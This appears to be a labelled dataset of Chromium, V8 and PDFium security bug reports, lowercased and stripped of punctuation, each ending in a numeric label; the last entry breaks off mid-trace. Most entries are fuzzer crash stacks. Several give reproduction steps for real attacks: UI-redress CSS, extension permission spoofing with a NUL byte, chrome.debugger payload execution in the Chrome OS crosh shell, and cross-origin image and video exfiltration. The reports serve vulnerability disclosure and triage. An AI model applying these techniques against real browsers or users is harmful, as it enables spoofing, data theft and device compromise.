b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/fonts/widthiterator.cpp:327:16 is located 184 bytes inside of 192-byte region freed by thread t0 chrome here 0 in interceptor_free asan_rtl_:0 1 in void webcore removedetachedchildrenincontainer webcore node webcore containernode webcore containernode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/containernodealgorithms.h:102:0 2 in webcore containernode containernode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/containernode.cpp:98:0 3 in webcore svgdefselement svgdefselement b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/svgdefselement.h:29:0 4 in derefifnotnull webcore svgelement b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/passrefptr.h:57:0 5 in refptr b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/refptr.h:51:0	11
segv in media inmemoryurlprotocol read looks like a heap overflow version chrome version version 36.0.1940.0 aura 263620 asan build operating system ubuntu 12.04 64 bit repro html script var r0=new audiocontext var r33=new arraybuffer 2147483649 r0.decodeaudiodata r33 function script body html asan 26680==error addresssanitizer segv on unknown address pc sp bp t9 0 in sanitizer internal_memcpy void void const unsigned long usr/local/google/home/thakis/src/chrome/src/third_party/llvm/projects/compiler-rt/lib/sanitizer_common/sanitizer_libc.cc:54 1 in memcpy asan_rtl 2 in media inmemoryurlprotocol read int unsigned char b/build/slave/asan_release__symbolized_/build/src/out/release media/filters/in_memory_url_protocol.cc:24 3 in media avioreadoperation void unsigned char int b/build/slave/asan_release__symbolized_/build/src/out/release media/filters/ffmpeg_glue.cc:24 4 in media ffmpegglue opencontext b/build/slave/asan_release__symbolized_/build/src/out/release media/filters/ffmpeg_glue.cc:166 5 in media audiofilereader open b/build/slave/asan_release__symbolized_/build/src/out/release media/filters/audio_file_reader.cc:35 6 in content decodeaudiofiledata blink webaudiobus char const unsigned long b/build/slave/asan_release__symbolized_/build/src/out/release content/renderer/media/audio_decoder.cc:39 7 in webcore decodeaudiofiledata char const unsigned long b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/audio/audiobus.cpp:641 8 in webcore createbusfrominmemoryaudiofile void const unsigned long bool float b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/audio/audiobus.cpp:666 9 in webcore audiobuffer createfromaudiofiledata void const unsigned long bool float b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/modules/webaudio/audiobuffer.cpp:69 10 in webcore asyncaudiodecoder decode wtf arraybuffer float webcore audiobuffercallback webcore audiobuffercallback b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/modules/webaudio/asyncaudiodecoder.cpp:67	11
uxss from a local mhtml file sorry for my bad english lol vulnerability details files in mht and mhtml formats can execute any javascript code in the context of any domain it s not enough for the majority of chromium-based browsers but it is enough for opera on mac os for example which opens mht files itself because it s difficult to make user simply open an mht file a solution was found in the form of html file that automatically downloads mht file and loads it in iframe in which the mht file is still executed because html files are opened using a default browser this vulnerability exists not only in opera perfect condition for reproduce is automatical file downloading on loading mht file from any site in iframe it will automatically downloaded in local downloads folder where probably shall be previously downloaded html file after mht file downloading we able to insert it in iframe where it will execute successfully we can refer to chromium warning this type of file can harm to blah-blah-blah but user can open html download link from any other app imessage rss-feed tweetbot etc and downaload html file without any warnings because it s not transfer any refer anyway everybody will press keep button when chrome warn thus user who opened link from external app and is n't changed default browser download settings is almost 100 vulnerable for demonstration i attached mht and html files which must save in one folder and then open html file live demonstration version all version of chromium which support mht files	9
security scrollbar-corner can be drawn outside the containing frame allowing redress of parent frame vulnerability details scrollbar corner rects are not constrained to the owning viewport allowing child documents to draw over their parents by specifying overly large dimensions for webkit-scrollbar pseudo-elements an attacker may then selectively overlay their own content using a semi-transparent background-image for webkit-scrollbar-corner so long as it is above or to the left of the frame content may also be drawn below and to the right of the frame using box-shadow sprites this may be used to spoof content as the location bar will remain the same and any indicators re untrusted content being framed may be drawn over as well as to clickjack the parent frame via ui redress the attached patch fixes the issue in scrollview scrollcornerrect by clamping the corner s rect to the viewport version chrome version 31.0.1650.63 stable operating system ubuntu 13.04 reproduction case a trivial example html body hi iframe width 1 height 1 srcdoc html head style html body width:99999999px height:9999999px webkit-scrollbar height 999999px width 999999px webkit-scrollbar-corner background-color red box-shadow 7px 7px green style head html iframe body html cr_scroll_content_spoofing.html in the attached archive is an example of how this may be used to trick users on pages that frame semi/untrusted content an animated semi-transparent gif is used for the corner s background-image so that it will be repainted every frame to cover any repaints in the parent frame the areas we want the user to use are made transparent so the usual caret and focus indicators will be show through the overlay and users may click and enter text into them as usual it also demonstrates that the framed document still receives click events as usual	11
unknown in v8 internal simulator decodetype3 detailed report fuzzer mbarbella_js_mutation job type linux_asan_d8_v8_arm crash type unknown crash address crash state crash stack v8 internal simulator decodetype3 v8 internal simulator instructiondecode v8 internal simulator callinternal regressed minimized testcase 3.28 kb	11
assertion failed static_cast fileerror errorcode code fileerror abort_err heap-use-after-free in v8 internal globalhandles node release vulnerability details the repro causes a uaf in global-handles set_state filesystem api with some control over the crash address increasing the count var when the window is being closed or string size of the blob to be written to the file will also increase the crash address the crash address therefore seems to be related to the position in the file when the window is closed automatically version chrome version 36.0.1933.0 dev tot 261961 261698 no crash operating system ubuntu 14.04 x64 reproduction case change count 10 or the size of the blob string 1 to alter the crash address 1 launch the repro script 2 press start for crashes please include the following additional information type of crash tab uaf crash state see added asan trace	11
crash in content rendererclipboardwritecontext writebitmapfrompixels detailed report fuzzer attekett_surku_fuzzer job type linux_asan_chrome_media crash type unknown crash address crash state crash stack libc.so.6 content rendererclipboardwritecontext writebitmapfrompixels content webclipboardimpl writeimage minimized testcase 8.42 kb additional requirements requires interaction gestures	11
heap-buffer-overflow in ff_er_frame_end detailed report fuzzer inferno_flicker job type linux_asan_chrome_media crash type heap-buffer-overflow read 1 crash address crash state crash stack ff_er_frame_end field_end decode_frame minimized testcase 5283.80 kb	11
security chrome for android url bar spoof vulnerability details this allows for phishing attacks where a malicious site can spoof the url of another site version chrome version 33.0.1750.136 stable operating system android 4.4.2 nexus 5 build/kot49h	9
security cache-based sop-bypass for images hello i ve got a cache-based sop-bypass for images in the current up-to-date versions of chrome in essence i can bypass the sop restrictions to load any protected image the victim has access to like from private gallery albums etc and exfiltrate it to my attacker origin as long as the image is served without anti-cache headers so basically it boils down to a sop-bypass that makes use of image caching to bypass sop checks it does n't matter if the image is served over https or http in what browser/os/platform/version current up-to-date chrome on windows and mac for example on my mac it s version 35.0.1916.114 here are the steps to reproduce i ve set up a demo on two domains for you to see it in action 1 open in chrome the victim s secret photo album at login using http auth with user test and password secret note that this could also be a cookie based auth i ve tested that also but here for simplicity it s http auth either way the folder is protected including the victim s secret image to exfiltrate 2 open in another tab/window the page controlled by the attacker at this page uses svg as well as canvas to embed the secret image cross-origin and strip it as dataurl and echoes it via alert and a textarea this is just for you to easily verify the exploit by copying the dataurl content from the textarea into some img src in order to see that this really is the secret image the attacker has accessed from the victim s login effectively bypassing the sop for canvas-images without triggering a tainted canvas security exception the point is that the exploit uses the object tag before dynamically fetching the same image referenced from within the svg and effectively exploits that the image cache does not enforce the sop when it is embedded into an svg using xlink eventually img would also work to populate the cache instead of just object using other ways to embed cross-origin images and exfiltrate them using canvas result in a tainted canvas security exception but this way works real world exploitation scenarios would either know the image urls or simply brute force for ascending numbers in image file names in protected galleries for example to secretly exfiltrate private photo albums or other secret document images from the victims like online banking charts of private portfolios or alike the only requirement for the attacker is that the image is not served with anti-caching headers which would otherwise effectively prevent the cache-based image sop-bypass but this requirement holds true for most protected photo albums or alike which could be leaked that way at least when a minimal caching period is allowed another exploitation scenario is for the attacker to check wether the victim is logged in with some sites or not in case the sites serve different images or not depending on the logged-in state in case of questions using the above demonstration please contact me see below i hope that the given information helps you to enhance the security of your products and i m happy to further assist you in solving this vulnerability and/or retesting possible solutions/patches best regards christian christian schneider software developer whitehat hacker trainer twitter cschneider4711 email mail christian-schneider.net web application security blog www.christian-schneider.net	2
same-origin security issue in video on android havard molland at opera has found a potential security issue with video on android to quote our internal bug report when playing video from video tag chromium on android uses a native media player however once the video url is handed over to the media player chromium has no longer control to figure out same origin issues chromium sends a info request on the video url before handing over the url if the request is redirected to different domain the same origin flag is set to false this is not enough as an attacker could simply choose to not redirect the info request while always redirecting the native player the attack goes like this user visits evil.com and is logged in on homevideos.com 0 user loads the evil.com page with video tag where src is pointing to evil.com 1 user starts playing video and chromium sends the info request to evil.com 2 evil.com receives the request and serve a response without redirecting 3 chromium hands over the url to the native player which sends the video request to evil.com 4 evil.com receives the request but redirects it to homevideos.com 5 the evil.com page is now playing a cross-origin video from homevideos.com but blink thinks that it is playing a same-origin video from evil.com this attack opens up for extracting video frames cross-origin by painting the video to a canvas when in-band subtitles are supported it will also allow extracting the times and texts of subtitles from cross-origin videos	9
heap-use-after-free in webcore kurl kurl detailed report fuzzer therealholden_worker job type windows_asan_chrome crash type heap-use-after-free read 4 crash address crash state crash stack webcore kurl kurl webcore newwebsocketchannelimpl newwebsocketchannelimpl free stack webcore newwebsocketchannelimpl fail webcore newwebsocketchannelimpl didfail unminimized testcase additional requirements requires interaction gestures filer inferno chromium.org	11
security spdy connection sharing logic errors allows for mitm antoine delignat-lavaud from inria reports 1 that we are connection pooling requests to bad certificates i.e ones that the user clicked through an interstitial for as i recall we intended for bad certs not to be pooling candidates but we may have missed the check as an attack give the victim an invalid cert for a captive portal site that they click through speak spdy or http/2 and have sans for example.com on that cert and fake dns in order to get requests pooled onto that connection 2 that connection pooling bypasses pinning i think we might have simply missed this in the past i believe that we need to add another condition to the pooling rules that we never pool across pinning domains i hope transportsecuritystate is to hand when we make these decisions if so we might want to add an isequalpinning function to it that takes two hostnames and compares whether they have equal pins for preloaded pins this is easy for dynamic pins we can compare the pinsets although we would then be depending on the fact that we require hpkp pins to include the current good cert this was previously just a footgun-amelioration measure	5
security asan heap-use-after-free in svgelement propertyfromattribute vulnerability details the attached testcase crashes the latest chromium asan build asan output attached in asan.txt version chrome version asan-symbolized-linux-release-267662 operating system linux reproduction case requires multiple files attached in crash.zip opening the testcase in multiple tabs helps if it does n't reproduce reliably for crashes please include the following additional information type of crash tab crash state attached in asan.txt	11
heap-use-after-free in webcore documentv8internal getelementbyidmethodcallbackformainworld useragent mozilla/5.0 x11 ubuntu linux x86_64 rv:30.0 gecko/20100101 firefox/30.0 steps to reproduce the problem 1 open repro2.html 2 3 profit what is the expected behavior i guess proper rendering but expectations usually depend on the situation what went wrong sorry for the time being i m not able to provide any details did this work before n/a chrome version 35.0.1916.153 official build 274914 channel stable os version 35.0.1916.153 flash version i do n't currently have access to a debug build for further investigation reporting this as a security issue just in case it does upset renderer of up-to-date stable versions of chrome on windows os x and linux dmesg on ubuntu spit out this 1981.562754 traps chrome 4838 general protection ip:7faa8ead32b2 sp:7fff1ee198c0 error:0 in chrome 7faa8bf90000+4f39000 dmesg on os x did not spit anything	11
security extensions can spoof the list of host permissions in the permission dialog this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details please provide a brief explanation of the security issue by inserting a nul byte in a host permission extension authors can hide all host permission requests giving users a false sense of security when they install an extension to solve this issue i suggest to reject the url pattern if it contains a nul byte version chrome version 37.0.2019.0 all versions all channels operating system archlinux x64 reproduction case please include a demonstration of the security bug such as an attached html or binary file that reproduces the bug when loaded in chrome please make the file as small as possible and remove any content not required to demonstrate the bug 1 create a directory and create contentscript.js and manifest.json attached below 2 start chrome and load the unpacked extension e.g using chromium load-extension=/tmp/extensiondirectory 3 visit chrome extensions and click on permissions observe that the dialog shows access your data on instead of access your data on example.com as seen in the attached screenshot 4 visit and observe that the content script executes even though the permission dialog said nothing about granting permissions to access this website manifest.json name seemingly harmless version 1 manifest_version 2 content_scripts js contentscript.js matches x00 example.com contentscript.js alert you did not expect this dialog did you	9
heap-use-after-free in v8 internal globalhandles create vulnerability details the attached testfile crash.html triggers a series of different crashes on the latest asan build of chrome maybe a jit issue the ogg file is required to trigger the event multiple tabs make the test case more reliable and crashing it multiple times leads to different crash signature version chrome version asan-symbolized-linux-release-280802 operating system linux 64-bit reproduction case attached for crashes please include the following additional information type of crash tab crash state different crashes as asan output in sym txt	11
security any extension can debug any other extension e.g crosh steps to reproduce the vulnerability 1 from the context of a chrome extension with privileges tabs debugger downloads installed on any version of chrome os since version 18 2 create a window with a location in the domain of the crosh console such as chrome-extension pnhechapfaindjhompbnflcldabbghjo/html/nassh_google_relay.html loads faster or crosh.html you can make this very small and place it behind current windows defocused or off-screen in order to hide it from the user 3 attach a debugger to the crosh tab with chrome.debugger.attach crosh_tab 1.0 function 4 wait for the tab to load if you go to crosh.html i polled chrome.tabs.get crosh_tab.tabid function tab for tab.status every 30ms 5 execute code in the crosh tab with chrome.debugger.sendcommand crosh_tab runtime.evaluate expression code function result your payload can either be in the form of term_.command.sendstring if you loaded crosh.html or by interfacing with chrome.terminalprivate if you loaded any page under chrome-extension pnhechapfaindjhompbnflcldabbghjo/html 5a window.addeventlistener onload function if you loaded crosh.html you may need to set a timeout of 2500ms on haswell chromebooks before running this window.onbeforeunload null get rid of the closing confirmation payload here window.close on chrome os 34 whether the user is in developer mode or not which gives them root access to the shell command in the crosh shell there is quite a lot of harm that can be caused using stable channel software on official hardware 1 dell chromebook 11 not in developer mode i have quite a lot of access in crosh looking at help_advanced specifically by using the downloads permission in conjunction with network_diag network_logging wpa_debug and ff_debug it should be possible to snoop on a lot of private user data i can wiretap the user s microphone with the download permission in conjection with sound record seconds various other harmful things i can do are disable the touchpad with tpcontrol mess with wifi and cellular hardware general dos of the chrome os device invoking a powerwash of the user s device using the rollback command chaps chrome s pkcs 11 implementation can be put into debug logging mode with chaps_debug start if you have physical proximity to the user you can configure the cellular hardware to connect to a malicious apn and mitm user s connections i m not sure if you can confiure the wifi hardware but if you can the same physical proximity constraints apply as soon as the user enters developer mode e.g to install an ubuntu chroot with crouton an extension using this exploit can immediately get root access and do anything it wants complete bypass of all chrome security unless the user sets a developer mode password using sudo chromeos-setdevpasswd before installing the extension in what browser/os/platform/version since chrome os 18 the later the chrome version the more i can do in the non-root crosh shell no matter what version since chrome os 18 i can do anything at all if the user is in developer mode as i can get root from crosh with the shell command additional details 1 version 34.0.1847.134 platform 5500.130.0 official build stable-channel wolf firmware google_wolf.4389.24.53 the tabs permission is not necessary for the vulnerability but it helps me exploit it faster the downloads permission extends on the first vulnerability by allowing me to wiretap the user s microphone and networking from crosh commands that save said information to downloads	2
security webgl draw buffers extension can expose unitialized video memory to webpage vulnerability details using the webgl draw buffers extension you can drawbuffers gl.none this prevents the usual implicit clear that happens before new draws this unitialized surface can then be read from version chrome version 35.0.1916.114 stable operating system os x 10.9 reproduction case i ve attached a modified version of the ext_draw_buffers conformance test suite that shows the problem you may need to refresh the page a couple of times and perhaps resize the window eventually you ll see content that looks like text or scroll bars in the canvas area	11
use-of-uninitialized-value in webcore biquaddspkernel updatecoefficientsifnecessary detailed report fuzzer attekett_webaudio_fuzzer job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state crash stack webcore biquaddspkernel updatecoefficientsifnecessary webcore biquaddspkernel getfrequencyresponse webcore biquadprocessor getfrequencyresponse minimized testcase 1.83 kb filer inferno chromium.org	11
bad-cast to webcore speechsynthesisutterance from webcore speechsynthesis v8eventtargetcustom.cpp:52:5 detailed report fuzzer inferno_twister job type linux_asan_chrome_experimental crash type bad-cast crash address crash state crash stack bad-cast to webcore speechsynthesisutterance from webcore speechsynthesis v8eventtargetcustom.cpp:52:5 minimized testcase 0.07 kb download script speechsynthesis.onvoiceschanged function script	11
heap-buffer-overflow in load_truetype_glyph detailed report uploader ifratric google.com job type foxit_test crash type heap-buffer-overflow read 1 crash address crash state crash stack load_truetype_glyph tt_glyph_load fpdfapi_ft_load_glyph	11
unknown in cmaplookupcallback detailed report uploader mjurczyk google.com job type foxit_test crash type unknown crash address crash state crash stack cmaplookupcallback cfx_basesegmentedarray iterateindex cfx_basesegmentedarray iterate minimized testcase 248.27 kb	11
unknown in cfxmem_fixedmgr alloclarge detailed report uploader mjurczyk google.com job type foxit_test crash type unknown crash address crash state crash stack cfxmem_fixedmgr alloclarge opj_tcd_init_decode_tile opj_j2k_read_tile_header minimized testcase 13196.03 kb	11
stack-buffer-overflow in icclib_translate detailed report uploader mjurczyk google.com job type foxit_test crash type stack-buffer-overflow read 4 crash address crash state crash stack icclib_translate cpdf_iccbasedcs getrgb cpdf_renderstatus loadsmask minimized testcase 1221.21 kb	11
unknown in cfxmem_page free detailed report uploader ifratric google.com job type foxit_test crash type unknown crash address crash state crash stack cfxmem_fixedmgr alloclarge fpdfapi_ft_mem_alloc cff_face_init	11
use-of-uninitialized-value in validate_layout detailed report fuzzer inferno_flicker job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state crash stack validate_layout opus_multistream_decoder_init opus_multistream_decoder_create minimized testcase 2724.74 kb filer inferno chromium.org	11
security integer overflow leads to buffer overflow in pdf_encodetext vulnerability details if the length of the input string in pdf_encodetext fpdf_parser_decode.cpp is equals to 2^31 2 and pcharmap is not null the expression 2 len 2 overflows to 2 result.getbuffer 2 will return some buffer despite negative size being requested this happens because fx_allocstring does n't check for negative values and the final malloc size remains positive for small negative inputs then this buffer will be overflown in the loop for int i 0 i len i dest_buf2 pstring i 8 dest_buf2 fx_byte pstring i i ca n't find any calls of pdf_encodetext with non null pcharmap but it is best not to rely on this fact	11
assert_with_security_implication i length in webcore document processarguments uptake	11
heap-buffer-overflow in cpdf_dibsource translatescanline24bpp detailed report uploader ifratric google.com job type foxit_test crash type heap-buffer-overflow read 1 crash address crash state crash stack cpdf_dibsource translatescanline24bpp cpdf_dibsource getscanline cfx_dibsource clone	11
security integer overflow in core/include/fxcrt/fx_basic.h and core/include/fxcrt/fx_memory.h fx_allocator_alloc has integer overflow 143 define fx_allocator_alloc fxallocator type size 144 fxallocator type fxallocator m_alloc fxallocator size sizeof type fx_alloc type size callers of this function are highly likely to assume that they have enough memory when in fact they may not the multiplication must be checked any number of callers direct and indirect are likely to be vulnerable additionally these calls to fxsys_memset32 can overflow 764 template class datatype int fixedsize 765 class cfx_fixedbufgrow public cfx_object 766 767 public 768 cfx_fixedbufgrow ifx_allocator pallocator null 769 m_pallocator pallocator 770 m_pdata null 771 772 cfx_fixedbufgrow int data_size ifx_allocator pallocator null 773 m_pallocator pallocator 774 m_pdata null 775 776 if data_size fixedsize 777 m_pdata fx_allocator_alloc m_pallocator datatype data_size 778 else 779 fxsys_memset32 m_data 0 sizeof datatype fixedsize 780 781 782 void setdatasize int data_size 783 784 if m_pdata 785 fx_allocator_free m_pallocator m_pdata 786 787 m_pdata null 788 if data_size fixedsize 789 m_pdata fx_allocator_alloc m_pallocator datatype data_size 790 else 791 fxsys_memset32 m_data 0 sizeof datatype fixedsize 792 793	11
heap-use-after-free in webcore renderinline inlineelementcontinuation detailed report fuzzer bj_broddelwerk job type linux_ubsan_vptr_chrome crash type bad-cast crash address crash state crash stack bad-cast to webcore renderobject renderinline.cpp:86:9 minimized testcase 15.68 kb filer inferno chromium.org	11
improper handling of calc parsing results in read access to pointer addresses some of the code in csspropertyparser.cpp is incorrectly reading fvalue when we actually have calc values which results in us reading a pointer value as a double it looks like if we check validunit then calcs will be allowed so we should n't simply look at fvalue sample this is n't the only case although it was the most obvious for var i 0 i 4 i 0.style.webkitfilter brightness calc 1 console.log 0.style.webkitfilter brightness 1.31248776293186e-310 brightness 1.31248776317613e-310 brightness 1.3124877632532e-310 brightness 1.3124877626971e-310 the printed values here directly correspond to the parser value pointers on the heap in this case maybe this is useful for breaking aslr	11
heap-use-after-free in cricket basechannel sendpacket detailed report fuzzer phoglund_webrtc_peerconnection job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack cricket basechannel sendpacket cricket webrtcmediachannel cricket voicemediachannel cricket webrtcvoiceengine sendpacket free stack jingle_glue jinglethreadwrapper willdestroycurrentmessageloop base messageloop messageloop additional requirements requires interaction gestures additional requirements requires http	11
heap-buffer-overflow in cpdf_truetypefont loadglyphmap detailed report uploader mjurczyk google.com job type foxit_test crash type heap-buffer-overflow write crash address crash state crash stack cpdf_truetypefont loadglyphmap cpdf_simplefont loadcommon cpdf_truetypefont load minimized testcase 1601.94 kb	11
heap-buffer-overflow in cpdf_devicecs translateimageline detailed report uploader mjurczyk google.com job type foxit_test crash type heap-buffer-overflow read 1 crash address crash state crash stack cpdf_devicecs translateimageline cpdf_dibsource downsamplescanline cfx_imagestretcher continuequickstretch minimized testcase 22518.55 kb	11
heap-buffer-overflow in cfx_widestring fromutf16le detailed report fuzzer ifratric_acrojs job type linux_asan_chrome_mp crash type heap-buffer-overflow read 8 crash address crash state crash stack cfx_widestring fromutf16le app response cjs_app response_static regressed minimized testcase 634.48 kb additional requirements requires interaction gestures	11
uninitialized ipc message in ppb_instance_proxy deliverframe i ve stumbled across this while cleaning up browser_tests under memorysanitizer this is probably not a recent issue in eckencryptedmediatest.loadloadablesession 20 warning memorysanitizer use-of-uninitialized-value 0 in ipc channelposix processoutgoingmessages ipc/ipc_channel_posix.cc:468:0 1 in ipc channelposix send ipc message ipc/ipc_channel_posix.cc:541:0 2 in ipc channelproxy context onsendmessage scoped_ptr ipc message base defaultdeleter ipc message ipc/ipc_channel_proxy.cc:175:0 3 in run base/bind_internal.h:190:0 4 in makeitso base/bind_internal.h:898:0 5 in base internal invoker 2 base internal bindstate base internal runnableadapter void ipc channelproxy context scoped_ptr ipc message base defaultdeleter ipc message void ipc channelproxy context scoped_ptr ipc message base defaultdeleter ipc message void scoped_refptr ipc channelproxy context base internal passedwrapper scoped_ptr ipc message base defaultdeleter ipc message void ipc channelproxy context scoped_ptr ipc message base defaultdeleter ipc message run base internal bindstatebase base/bind_internal.h:1248:0 6 in run base/callback.h:401:0 7 in base messageloop runtask base pendingtask const base/message_loop/message_loop.cc:458:0 8 in deferorrunpendingtask base/message_loop/message_loop.cc:470:0 9 in base messageloop dowork base/message_loop/message_loop.cc:584:0 10 in base messagepumplibevent run base messagepump delegate base/message_loop/message_pump_libevent.cc:232:0 11 in base messageloop runhandler base/message_loop/message_loop.cc:408:0 12 in base runloop run base/run_loop.cc:49:0 13 in base messageloop run base/message_loop/message_loop.cc:301:0 14 in base thread run base messageloop base/threading/thread.cc:174:0 15 in base thread threadmain base/threading/thread.cc:228:0 16 in base anonymous namespace threadfunc void base/threading/platform_thread_posix.cc:80:0 17 in start_thread build/buildd/eglibc-2.15/nptl/pthread_create.c:308:0 18 in clone build/buildd/eglibc-2.15/misc sysdeps/unix/sysv/linux/x86_64/clone.s:112:0 uninitialized value was stored to memory at 0 in msan_memcpy usr/local/google/work/chromium/src/third_party/llvm/projects/compiler-rt/lib/msan/msan_interceptors.cc:1335:0 1 in writebytescommon base/pickle.cc:358:0 2 in writebytes base/pickle.cc:292:0 3 in pickle writestring std 1 basic_string char std 1 char_traits char std 1 allocator char const base/pickle.cc:268:0 4 in write ipc/ipc_message_utils.h:244:0 5 in writeparam std 1 basic_string char std 1 char_traits char std 1 allocator char ipc/ipc_message_utils.h:94:0 6 in write ipc/ipc_message_utils.h:572:0 7 in writeparam tuple3 const int const int const std 1 basic_string char std 1 char_traits char std 1 allocator char ipc/ipc_message_utils.h:94:0 8 in ipc messageschema tuple3 int int std 1 basic_string char std 1 char_traits char std 1 allocator char write ipc message tuple3 int const int const std 1 basic_string char std 1 char_traits char std 1 allocator char const const ipc/ipc_message_utils_impl.h:16:0 9 in ppapihostmsg_ppbinstance_deliverframe ppapihostmsg_ppbinstance_deliverframe int int const int const std 1 basic_string char std 1 char_traits char std 1 allocator char const ppapi/proxy/ppapi_messages.h:1132:0 10 in ppapi proxy ppb_instance_proxy deliverframe int int pp_decryptedframeinfo const ppapi/proxy/ppb_instance_proxy.cc:723:0 11 in non-virtual thunk to ppapi proxy ppb_instance_proxy deliverframe int int pp_decryptedframeinfo const ppapi/proxy/ppb_instance_proxy.cc:728:0 12 in ppapi thunk anonymous namespace deliverframe int int pp_decryptedframeinfo const ppapi/thunk/ppb_content_decryptor_private_thunk.cc:156:0 13 in pp contentdecryptor_private deliverframe pp buffer_dev pp_decryptedframeinfo const ppapi/cpp/private/content_decryptor_private.cc:375:0 14 in media cdmadapter deliverframe int cdm status const linked_ptr media videoframeimpl const pp_decrypttrackinginfo const media/cdm/ppapi/cdm_adapter.cc:935:0 15 in operator ppapi/utility/completion_callback_factory.h:779:0 16 in thunk ppapi/utility/completion_callback_factory.h:582:0 17 in pp_runcompletioncallback ppapi/c/pp_completion_callback.h:240:0 18 in run ppapi/cpp/completion_callback.h:84:0 19 in callonmain media/cdm/ppapi/cdm_adapter.cc:43:0 20 in media cdmadapter decryptanddecode pp_decryptorstreamtype pp buffer_dev pp_encryptedblockinfo const media/cdm/ppapi/cdm_adapter.cc:540:0 21 in non-virtual thunk to media cdmadapter decryptanddecode pp_decryptorstreamtype pp buffer_dev pp_encryptedblockinfo const media/cdm/ppapi/cdm_adapter.cc:566:0 22 in pp anonymous namespace decryptanddecode int pp_decryptorstreamtype int pp_encryptedblockinfo const ppapi/cpp/private/content_decryptor_private.cc:202:0 23 in callwhileunlocked void int pp_decryptorstreamtype int const pp_encryptedblockinfo ppapi/shared_impl/proxy_lock.h:147:0 24 in ppapi proxy ppp_contentdecryptor_private_proxy onmsgdecryptanddecode int pp_decryptorstreamtype ppapi proxy pppdecryptor_buffer const std 1 basic_string char std 1 char_traits char std 1 allocator char const ppapi/proxy/ppp_content_decryptor_private_proxy.cc:641:0 25 in dispatchtomethod ppapi proxy ppp_contentdecryptor_private_proxy void ppapi proxy ppp_contentdecryptor_private_proxy int pp_decryptorstreamtype const ppapi proxy pppdecryptor_buffer const std 1 basic_string char std 1 char_traits char std 1 allocator char int pp_decryptorstreamtype ppapi proxy pppdecryptor_buffer std 1 basic_string char std 1 char_traits char std 1 allocator char base/tuple.h:570:0 26 in dispatch ppapi proxy ppp_contentdecryptor_private_proxy ppapi proxy ppp_contentdecryptor_private_proxy void void ppapi proxy ppp_contentdecryptor_private_proxy int pp_decryptorstreamtype const ppapi proxy pppdecryptor_buffer const std 1 basic_string char std 1 char_traits char std 1 allocator char ppapi/proxy/ppapi_messages.h:798:0 27 in ppapi proxy ppp_contentdecryptor_private_proxy onmessagereceived ipc message const ppapi/proxy/ppp_content_decryptor_private_proxy.cc:448:0 28 in ppapi proxy dispatcher onmessagereceived ipc message const ppapi/proxy/dispatcher.cc:69:0 29 in ppapi proxy plugindispatcher onmessagereceived ipc message const ppapi/proxy/plugin_dispatcher.cc:238:0 30 in ipc channelproxy context ondispatchmessage ipc message const ipc/ipc_channel_proxy.cc:273:0 31 in run base/bind_internal.h:190:0 32 in makeitso base/bind_internal.h:898:0 33 in base internal invoker 2 base internal bindstate base internal runnableadapter void ipc channelproxy context ipc message const void ipc channelproxy context ipc message const void ipc channelproxy context ipc message void ipc channelproxy context ipc message const run base internal bindstatebase base/bind_internal.h:1248:0 34 in run base/callback.h:401:0 35 in base messageloop runtask base pendingtask const base/message_loop/message_loop.cc:458:0 uninitialized value was stored to memory at 0 in msan_memcpy usr/local/google/work/chromium/src/third_party/llvm/projects/compiler-rt/lib/msan/msan_interceptors.cc:1335:0 1 in copy third_party/libc++/trunk/include/string:662:0 2 in grow_by_and_replace third_party/libc++/trunk/include/string:2266:0 3 in std 1 basic_string char std 1 char_traits char std 1 allocator char assign char const unsigned long third_party/libc++/trunk/include/string:2327:0 4 in serializeblockinfo pp_decryptedframeinfo ppapi/proxy/content_decryptor_private_serializer.h:32:0 5 in ppapi proxy ppb_instance_proxy deliverframe int int pp_decryptedframeinfo const ppapi/proxy/ppb_instance_proxy.cc:718:0 6 in non-virtual thunk to ppapi proxy ppb_instance_proxy deliverframe int int pp_decryptedframeinfo const ppapi/proxy/ppb_instance_proxy.cc:728:0 7 in ppapi thunk anonymous namespace deliverframe int int pp_decryptedframeinfo const ppapi/thunk/ppb_content_decryptor_private_thunk.cc:156:0 8 in pp contentdecryptor_private deliverframe pp buffer_dev pp_decryptedframeinfo const ppapi/cpp/private/content_decryptor_private.cc:375:0 9 in media cdmadapter deliverframe int cdm status const linked_ptr media videoframeimpl const pp_decrypttrackinginfo const media/cdm/ppapi/cdm_adapter.cc:935:0 10 in operator ppapi/utility/completion_callback_factory.h:779:0 11 in thunk ppapi/utility/completion_callback_factory.h:582:0 12 in pp_runcompletioncallback ppapi/c/pp_completion_callback.h:240:0 13 in run ppapi/cpp/completion_callback.h:84:0 14 in callonmain media/cdm/ppapi/cdm_adapter.cc:43:0 15 in media cdmadapter decryptanddecode pp_decryptorstreamtype pp buffer_dev pp_encryptedblockinfo const media/cdm/ppapi/cdm_adapter.cc:540:0 16 in non-virtual thunk to media cdmadapter decryptanddecode pp_decryptorstreamtype pp buffer_dev pp_encryptedblockinfo const media/cdm/ppapi/cdm_adapter.cc:566:0 17 in pp anonymous namespace decryptanddecode int pp_decryptorstreamtype int pp_encryptedblockinfo const ppapi/cpp/private/content_decryptor_private.cc:202:0 18 in callwhileunlocked void int pp_decryptorstreamtype int const pp_encryptedblockinfo ppapi/shared_impl/proxy_lock.h:147:0 19 in ppapi proxy ppp_contentdecryptor_private_proxy onmsgdecryptanddecode int pp_decryptorstreamtype ppapi proxy pppdecryptor_buffer const std 1 basic_string char std 1 char_traits char std 1 allocator char const ppapi/proxy/ppp_content_decryptor_private_proxy.cc:641:0 20 in dispatchtomethod ppapi proxy ppp_contentdecryptor_private_proxy void ppapi proxy ppp_contentdecryptor_private_proxy int pp_decryptorstreamtype const ppapi proxy pppdecryptor_buffer const std 1 basic_string char std 1 char_traits char std 1 